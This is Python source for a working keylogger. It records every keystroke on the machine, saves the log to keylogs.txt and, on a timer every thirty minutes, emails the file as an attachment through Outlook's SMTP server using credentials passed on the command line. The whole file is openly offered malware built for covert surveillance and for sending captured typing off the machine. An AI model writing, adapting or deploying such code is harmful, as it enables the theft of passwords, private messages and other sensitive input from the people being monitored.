import keyboard # for keylog

#Email imports
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders



from threading import Timer
from datetime import datetime


import sys


SEND_REPORT_EVERY = 1800 # in seconds, 60 means 1 minute and so on

class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
        """
        def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
        """
    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open("keylogs.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        
        print(f"[+] Saved KEYLOG")







    def sendmail(self, email_Cred):
        self.report_to_file()

        msg = MIMEMultipart()
        msg['From'] = email_Cred[1]
        msg['To'] = email_Cred[1]
        msg['Subject'] = 'Current Status'
        


        attachment  = open("keylogs.txt",'rb')

        #EMAIL CREATION
        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment; filename= keylogs.txt" )

        msg.attach(part)
        text = msg.as_string()
        server = smtplib.SMTP('smtp.outlook.com',587)
        server.starttls()
        server.login(email_Cred[1],email_Cred[2])


        server.sendmail(email_Cred[1],email_Cred[1],text)
        server.quit()
        attachment.close() 






    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            #self.update_filename()
            self.sendmail(sys.argv)
            
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
